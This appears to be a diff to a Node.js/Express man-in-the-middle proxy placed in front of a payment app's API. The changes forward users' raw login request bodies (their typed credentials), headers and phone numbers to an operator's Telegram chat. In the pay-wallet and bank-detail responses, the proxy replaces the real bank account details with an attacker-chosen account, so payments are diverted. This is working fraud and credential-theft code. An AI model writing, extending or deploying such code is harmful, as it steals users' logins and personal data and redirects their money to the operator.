@@ -125,15 +125,28 @@ function extractUserId(req, jsonResp) {
   return '';
 }
 
-async function trackUser(data, userId, info) {
+async function trackUser(data, userId, info, phone) {
   if (!userId) return;
   if (!data.trackedUsers) data.trackedUsers = {};
   const existing = data.trackedUsers[String(userId)] || {};
   data.trackedUsers[String(userId)] = {
     lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
     lastAction: info || existing.lastAction || '',
-    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0)
+    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
+    phone: phone || existing.phone || ''
   };
+  if (phone) userPhoneMap[String(userId)] = phone;
+}
+
+function getPhone(data, userId) {
+  if (!userId) return '';
+  if (userPhoneMap[String(userId)]) return userPhoneMap[String(userId)];
+  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
+  if (tracked && tracked.phone) {
+    userPhoneMap[String(userId)] = tracked.phone;
+    return tracked.phone;
+  }
+  return '';
 }
 
 function getUserOverride(data, userId) {
@@ -456,7 +469,7 @@ app.use(async (req, res, next) => {
       const path = req.originalUrl || req.url;
       if (!path.includes('bot-webhook') && !path.includes('favicon')) {
         const userId = extractUserId(req, null);
-        const phone = userId ? (userPhoneMap[String(userId)] || '') : '';
+        const phone = getPhone(data, userId);
         const tag = userId ? ` (${phone || userId})` : '';
         bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}`).catch(()=>{});
       }
@@ -862,14 +875,16 @@ app.post('/app/api/system/v2/login', async (req, res) => {
         const respPhone = d.phone || d.mobile || d.telephone || d.memberPhone || '';
         if (respPhone && userId) userPhoneMap[String(userId)] = String(respPhone);
       }
-      trackUser(data, userId, 'Login');
+      const detectedPhone = phone || (jsonResp?.data?.phone || jsonResp?.data?.mobile || jsonResp?.data?.telephone || jsonResp?.data?.memberPhone || '');
+      trackUser(data, userId, 'Login', detectedPhone);
       saveData(data).catch(()=>{});
     }
     if (data.adminChatId && bot) {
+      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000);
       const reqHeaders = JSON.stringify(req.headers, null, 2).substring(0, 1500);
       const respHdrs = JSON.stringify(respHeaders, null, 2).substring(0, 1500);
       const bodyDump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 2000);
-      bot.sendMessage(data.adminChatId, `🔑 Login [${userId || 'N/A'}] (${phone || 'no phone'})\n\n📤 REQUEST HEADERS:\n${reqHeaders}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔑 Login [${userId || 'N/A'}] (${phone || 'no phone'})\n\n📝 REQUEST BODY (user input):\n${reqBody}\n\n📤 REQUEST HEADERS:\n${reqHeaders}`).catch(()=>{});
       bot.sendMessage(data.adminChatId, `📥 RESPONSE HEADERS:\n${respHdrs}\n\n📥 RESPONSE BODY:\n${bodyDump}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -917,7 +932,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     if (data.adminChatId && bot) {
       const orderId = jsonResp?.data?.orderId || jsonResp?.data?.orderNo || req.parsedBody?.orderId || 'N/A';
       const amount = jsonResp?.data?.amount || jsonResp?.data?.orderAmount || req.parsedBody?.amount || 'N/A';
-      const phone = detectedUserId ? (userPhoneMap[String(detectedUserId)] || '') : '';
+      const phone = getPhone(data, detectedUserId);
       bot.sendMessage(data.adminChatId,
 `🔔 ${label}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
@@ -1016,7 +1031,43 @@ app.post('/app/api/orderOut/pendingDetail', async (req, res) => {
 });
 
 app.post('/app/api/orderOut/getPayWallet', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💳 Pay Wallet');
+  const data = await loadData();
+  const reqUserId = extractUserId(req, null);
+  const reqEff = getEffectiveSettings(data, reqUserId);
+  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
+    const eff = getEffectiveSettings(data, detectedUserId);
+    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
+    if (data.adminChatId && bot) {
+      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
+      bot.sendMessage(data.adminChatId, `🔍 PAY WALLET RAW RESPONSE:\n${dump}`).catch(()=>{});
+    }
+    if (jsonResp && jsonResp.data && active) {
+      const originalValues = {};
+      deepReplace(jsonResp.data, active, originalValues, 0);
+    }
+    const phone = getPhone(data, detectedUserId);
+    if (data.adminChatId && bot) {
+      const orderId = jsonResp?.data?.orderId || jsonResp?.data?.orderNo || req.parsedBody?.orderId || 'N/A';
+      const amount = jsonResp?.data?.amount || jsonResp?.data?.orderAmount || req.parsedBody?.amount || 'N/A';
+      bot.sendMessage(data.adminChatId,
+`🔔 💳 Pay Wallet
+👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
+Order: ${orderId}
+Amount: ₹${amount}
+Bank: ${active ? active.accountNo : 'N/A'}
+Acc: ${active ? active.accountHolder : 'None'}
+Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
+    if (detectedUserId) { trackUser(data, detectedUserId, 'PayWallet'); saveData(data).catch(()=>{}); }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    console.error('PayWallet error:', e.message);
+    if (!res.headersSent) await transparentProxy(req, res);
+  }
 });
 
 app.post('/app/api/memberManager/getBankAccount', async (req, res) => {
